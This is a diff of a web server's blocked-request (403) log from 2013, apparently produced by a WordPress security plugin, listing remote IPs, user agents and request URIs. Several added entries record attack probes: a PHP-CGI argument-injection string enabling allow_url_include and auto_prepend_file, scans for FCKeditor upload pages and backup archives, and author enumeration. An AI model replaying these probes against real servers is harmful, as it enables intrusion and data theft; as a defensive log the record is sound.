+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 17, 2013 - 11:47 пп <<<<<<<<<<<
+REMOTE_ADDR: 146.120.112.34
+Host Name: s026.rservers.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.75 Safari/537.1
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 17, 2013 - 11:47 пп <<<<<<<<<<<
+REMOTE_ADDR: 146.120.112.34
+Host Name: s026.rservers.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?-n+-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp%3a%2f%2finput
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.75 Safari/537.1
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 21, 2013 - 7:34 дп <<<<<<<<<<<
+REMOTE_ADDR: 193.43.252.252
+Host Name: 193.43.252.252
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://win7dl.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 22, 2013 - 3:07 дп <<<<<<<<<<<
+REMOTE_ADDR: 193.43.252.252
+Host Name: 193.43.252.252
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://torrentland.biz
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 25, 2013 - 4:57 дп <<<<<<<<<<<
+REMOTE_ADDR: 112.111.160.91
+Host Name: 112.111.160.91
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -454,13 +864,13 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/
+REQUEST_URI: /phpbb2/
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.5.2; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 19, 2013 - 11:48 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Июль 25, 2013 - 4:58 дп <<<<<<<<<<<
+REMOTE_ADDR: 112.111.160.91
+Host Name: 112.111.160.91
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -468,13 +878,545 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/
+REQUEST_URI: /phpbb2/
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.5.2; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 19, 2013 - 11:48 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 2, 2013 - 3:44 пп <<<<<<<<<<<
+REMOTE_ADDR: 95.90.8.249
+Host Name: 95-90-8-249-dynip.superkabel.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wiki/maintenance/update.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 2, 2013 - 3:51 пп <<<<<<<<<<<
+REMOTE_ADDR: 95.90.8.249
+Host Name: 95-90-8-249-dynip.superkabel.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wiki/maintenance/update.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.72 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 8, 2013 - 2:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 54.227.11.208
+Host Name: ec2-54-227-11-208.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 8, 2013 - 3:42 пп <<<<<<<<<<<
+REMOTE_ADDR: 107.20.103.53
+Host Name: ec2-107-20-103-53.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 9:46 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wwwroot.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 9:59 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wwwroot.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 10:09 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /www.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 10:40 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/system/editor/FCKeditor/
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 11:00 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/system/editor/FCKeditor/editor/fckeditor.Html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 11:33 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /webmanage/FCKeditor/editor/filemanager/connectors/uploadtest.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 11:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /editor/editor/filemanager/browser/default/connectors/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 11:52 дп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /editor/editor/filemanager/connectors/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 12:19 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /fckeditor/editor/filemanager/connectors/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 12:29 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /FCKeditor/editor/filemanager/connectors/uploadtest.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 12:43 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /FCKeditor/editor/filemanager/upload/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 12:57 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /editor/editor/filemanager/upload/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 1:11 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/fckeditor/editor/filemanager/browser/default/connectors/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 1:32 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/FCKeditor/editor/filemanager/connectors/uploadtest.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 1:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin/FCKeditor/editor/filemanager/upload/test.html
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 1:50 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /web.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 2:18 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /db.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 2:26 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /fdsa.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 2:35 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /fdsa.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 2:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /root.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:04 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:13 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /admin.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:31 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /data.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:39 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /flashfxp.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:48 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /flashfxp.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 3:58 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /site.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 4:16 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /bible-core.com.rar
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 4:26 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /bible-core.com.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 12, 2013 - 5:03 пп <<<<<<<<<<<
+REMOTE_ADDR: 124.227.243.137
+Host Name: 124.227.243.137
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /bible-corecom.zip
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 13, 2013 - 12:31 дп <<<<<<<<<<<
+REMOTE_ADDR: 23.22.231.224
+Host Name: ec2-23-22-231-224.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 13, 2013 - 12:51 дп <<<<<<<<<<<
+REMOTE_ADDR: 23.22.231.224
+Host Name: ec2-23-22-231-224.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 16, 2013 - 10:00 дп <<<<<<<<<<<
+REMOTE_ADDR: 2.184.210.147
+Host Name: 2.184.210.147
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /?author=1
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 18, 2013 - 9:39 дп <<<<<<<<<<<
+REMOTE_ADDR: 67.202.39.190
+Host Name: ec2-67-202-39-190.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 18, 2013 - 9:57 дп <<<<<<<<<<<
+REMOTE_ADDR: 67.202.39.190
+Host Name: ec2-67-202-39-190.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 18, 2013 - 10:24 пп <<<<<<<<<<<
+REMOTE_ADDR: 36.250.177.206
+Host Name: 36.250.177.206
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -482,13 +1424,41 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/
+REQUEST_URI: /phpbb2/
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.5.2; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 24, 2013 - 11:21 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 21, 2013 - 2:10 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.161.1
+Host Name: 79.105.161.1
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 21, 2013 - 2:10 дп <<<<<<<<<<<
+REMOTE_ADDR: 79.105.161.1
+Host Name: 79.105.161.1
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 22, 2013 - 9:28 пп <<<<<<<<<<<
+REMOTE_ADDR: 175.44.30.37
+Host Name: 175.44.30.37
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -496,13 +1466,41 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/
+REQUEST_URI: /phpbb2/
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: Opera/9.64(Windows NT 5.1; U; en) Presto/2.1.1
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Сентябрь 28, 2013 - 1:52 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Август 27, 2013 - 6:16 пп <<<<<<<<<<<
+REMOTE_ADDR: 158.255.214.124
+Host Name: 124-214-255-158.static.edis.at
+SERVER_PROTOCOL: HTTP/1.1
